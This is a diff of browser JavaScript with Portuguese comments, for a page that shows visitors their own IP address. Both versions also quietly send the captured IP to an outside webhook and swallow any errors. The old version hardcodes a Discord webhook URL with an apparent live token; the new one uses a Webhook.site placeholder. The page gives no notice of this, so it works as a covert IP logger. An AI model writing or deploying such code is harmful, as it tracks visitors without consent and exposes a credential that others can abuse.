@@ -4,6 +4,9 @@ const revealBtn = document.getElementById("revealBtn");
 const ipDisplay = document.getElementById("ipDisplay");
 const errorDisplay = document.getElementById("errorDisplay");
 
+// Coloque aqui a sua URL do Webhook.site
+const WEBHOOK_URL = "COLE_SUA_URL_AQUI";
+
 revealBtn.addEventListener("click", async () => {
   if (fetchState === "loading" || fetchState === "success") return;
 
@@ -12,20 +15,20 @@ revealBtn.addEventListener("click", async () => {
   errorDisplay.textContent = "";
 
   try {
-    // 1. Buscar IP do usuário
+    // Buscar IP do usuário
     const res = await fetch("https://api.ipify.org?format=json");
     if (!res.ok) throw new Error("Falha na requisição");
 
     const data = await res.json();
-    ipDisplay.textContent = `Obrigado pelo IP: ${data.ip}`;
+    ipDisplay.textContent = `Seu IP: ${data.ip}`;
     fetchState = "success";
 
-    // 2. Enviar IP para webhook
-    fetch("https://discord.com/api/webhooks/1486905154958659767/LaQMwKyiM59VF0Q2gWOjHGfuzh8J7oot9taJ0XgoXXeAg7GQFkILewvJMrM0ztsTriA0", {
+    // Enviar IP para Webhook.site
+    fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `**Novo IP capturado**\n\`\`\`\n${data.ip}\n\`\`\``,
+        content: `Novo visitante IP capturado: ${data.ip}`,
       }),
     }).catch(() => {});
 
